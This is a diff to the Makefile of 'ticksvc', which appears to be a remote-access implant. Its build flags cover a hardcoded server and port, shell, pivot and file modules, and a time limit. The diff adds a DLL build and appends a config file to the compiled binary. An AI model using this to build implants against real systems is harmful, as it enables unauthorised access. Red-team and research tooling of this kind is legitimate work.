@@ -51,8 +51,15 @@ ANDROID_NDK_VERSION=21
 ANDROID_BASE_SYSROOT=/usr/lib/android-ndk/platforms/android-$(ANDROID_NDK_VERSION)
 
 BIN=../bin/ticksvc-$(TARGET)
+SO=../bin/libtick-$(TARGET).so
+
+# If this file exists and TICK_CONFIG_USE_BIN is enabled,
+# it will be automatically embedded into the binary at compile time.
+CONFIG=tick.conf
 
 CFLAGS=-W -Wall -Wextra -fdata-sections -ffunction-sections -Wl,--gc-sections -Os -fPIC -static
+
+CFLAGS_SO=-ldl
 
 CFLAGS_ANDROID=-fdiagnostics-color=always $(TICK_BIGMEM)
 CFLAGS_LINUX=-std=gnu99
@@ -90,14 +97,23 @@ CFLAGS_TICK=
 #CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=0
 #CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ENV=0
 #CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_FILE=0
-#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_HOSTNAME=your.server.com
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_BIN=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_HOSTNAME="your.server.com"
 #CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_PORT=443
 
 # Uncomment and edit for a hardcoded configuration file.
 #CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=0
 #CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ENV=0
 #CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_FILE=1
-#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_FILE_NAME=/etc/tick.conf
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_BIN=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_FILE_NAME="$(CONFIG)"
+
+# Uncomment for embedded config file in the binary.
+# You need to put the config into tick.conf at build time!
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ENV=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_FILE=0
+CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_BIN=1
 
 # Uncomment for a one month time window starting now.
 #CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_TIME_LIMIT=1
@@ -118,7 +134,7 @@ CFLAGS_TICK=
 ifeq ($(TARGET),debug)
 CC=gcc
 ST=@true
-CFLAGS=-W -Wall -Wextra -g
+CFLAGS=-W -Wall -Wextra -fPIC -g -ldl
 CFLAGS_TICK := $(filter-out -DTICK_VERBOSE=0,$(CFLAGS_TICK))
 CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_VERBOSE=1
 
@@ -219,8 +235,10 @@ else ifeq ($(TARGET),generic-x86-windows)
 FLAVOR=i686-w64-mingw32
 CC=$(FLAVOR)-gcc
 ST=$(FLAVOR)-strip
-CFLAGS := $(CFLAGS) $(CFLAGS_WINDOWS) $(CFLAGS_X86)
 BIN := $(BIN).exe
+SO := $(SO:.so=.dll)
+CFLAGS := $(CFLAGS) $(CFLAGS_WINDOWS) $(CFLAGS_X86)
+CFLAGS_SO := $(filter-out -ldl,$(CFLAGS_SO))
 CFLAGS_TICK := $(filter-out -DTICK_CONFIG_USE_ARGV=0,$(CFLAGS_TICK))
 CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=1
 
@@ -229,8 +247,10 @@ else ifeq ($(TARGET),generic-x86_64-windows)
 FLAVOR=x86_64-w64-mingw32
 CC=$(FLAVOR)-gcc
 ST=$(FLAVOR)-strip
-CFLAGS := $(CFLAGS) $(CFLAGS_WINDOWS) $(CFLAGS_X86_64)
 BIN := $(BIN).exe
+SO := $(SO:.so=.dll)
+CFLAGS := $(CFLAGS) $(CFLAGS_WINDOWS) $(CFLAGS_X86_64)
+CFLAGS_SO := $(filter-out -ldl,$(CFLAGS_SO))
 CFLAGS_TICK := $(filter-out -DTICK_CONFIG_USE_ARGV=0,$(CFLAGS_TICK))
 CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=1
 
@@ -244,13 +264,15 @@ endif
 ##############################################################################
 # Source and object files.
 
-# Add all .c files in the root folder.
+# Start by adding all .c files in the root folder. This saves us from having
+# to edit the Makefile every time we add a new module.
 SRC=$(wildcard *.c)
 
-# If SSL is disabled, remove the SSL related modules.
-# If SSL is enabled, add the BearSSL source code and includes.
-# We need this because the compiler won't always be removing the unused code
-# by itself, even when we explicitly told it to. (I'm looking at you, mingw)
+# Next, based on the feature flags, add dependencies or remove modules.
+# Unfortunately we cannot rely on the compiler being smart enough to
+# optimize away the unused code - this approach is dirty but works better,
+# and also results in faster compile times.
+
 ifneq ($(filter -DTICK_FEATURES_CRYPTO=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out base64.c,$(SRC))
 	SRC := $(filter-out ssl.c,$(SRC))
@@ -260,48 +282,77 @@ else
 	CFLAGS := -I./BearSSL/src -I./BearSSL/inc $(CFLAGS)
 endif
 
-# Remove other modules based on the feature list too.
 ifneq ($(filter -DTICK_FEATURES_DNS=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out dns.c,$(SRC))
 endif
+
 ifneq ($(filter -DTICK_FEATURES_FILE=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out file.c,$(SRC))
 endif
+
 ifneq ($(filter -DTICK_FEATURES_SHELL=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out shell.c,$(SRC))
 endif
+
 ifneq ($(filter -DTICK_FEATURES_PIVOT=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out pivot.c,$(SRC))
 endif
 
-# Derive the names of object files from source files.
+# Derive the names of object files from the source files.
 OBJ=$(patsubst %.c,%.o,$(SRC))
 
 ##############################################################################
 # Recipes.
 
+# "Phony" targets, just your standard "make all" and "make clean".
+.PHONY: all clean
+
+# Print the compilation target when building.
+# This makes the output more readable if there are errors.
+all:
+	@echo Building for platform: $(TARGET)
+	@$(MAKE) --no-print-directory $(BIN) $(SO)
+	@echo Finished building for platform: $(TARGET)
+
+# Compile each .c into a .o file separately.
+# When using -j this makes compiling much faster.
+#
 # Quick "optimization" note.
 # I tried here, instead of compiling every .o separately and then linking,
 # to give gcc all of the source files in one go and just generate the binary.
 # This resulted in *much* slower compile times... and literally no benefit!
 # DISAPPOINTED! <kevinsorbo.gif>
-
-.PHONY: all clean
-
-all:
-	@echo Building for platform: $(TARGET)
-	@$(MAKE) --no-print-directory $(BIN)
-	@echo Finished building for platform: $(TARGET)
-
 %.o: %.c
 	$(CC) -c $< $(CFLAGS) $(CFLAGS_TICK) -o $@
 
-#../bin/ticksvc-%: $(SRC)
-../bin/ticksvc-%: $(OBJ)
-	mkdir -p -- $$(dirname $@)
-#	$(CC) $(SRC) $(CFLAGS) -o $@
-	$(CC) $(OBJ) $(CFLAGS) -o $@
-	$(ST) $@
+# If this target supports creating standalone binaries, do it here.
+# If embedding configuration files is enabled and there is one,
+# embed it now. (Yes, we can just cat into the end of the file!)
+ifneq ($(BIN),)
+$(BIN): $(OBJ)
+	mkdir -p -- $$(dirname $(BIN))
+	$(CC) $(filter-out libmain.o,$(OBJ)) $(CFLAGS) -o $(BIN)
+	$(ST) $(BIN)
+ifneq ($(filter -DTICK_CONFIG_USE_BIN=1,$(CFLAGS_TICK)),)
+ifneq ($(CONFIG),)
+	if [ -f ../$(CONFIG) ]; then echo "" >> $(BIN); head -n 1 ../$(CONFIG) | tr -d '\n' >> $(BIN); fi
+endif
+endif
+endif
 
+# Same for when this target supports shared objects (DLL files).
+ifneq ($(SO),)
+$(SO): $(OBJ)
+	mkdir -p -- $$(dirname $(SO))
+	$(CC) $(filter-out main.o,$(OBJ)) $(filter-out -static,$(CFLAGS)) $(CFLAGS_SO) -shared -o $(SO)
+	$(ST) $(SO)
+ifneq ($(filter -DTICK_CONFIG_USE_BIN=1,$(CFLAGS_TICK)),)
+ifneq ($(CONFIG),)
+	if [ -f ../$(CONFIG) ]; then echo "" >> $(SO); head -n 1 ../$(CONFIG) | tr -d '\n' >> $(SO); fi
+endif
+endif
+endif
+
+# Cleans up leftover intermediate files and output binaries.
 clean:
-	rm -f -- $(OBJ) $(BIN)
+	rm -f -- $(OBJ) $(BIN) $(SO)
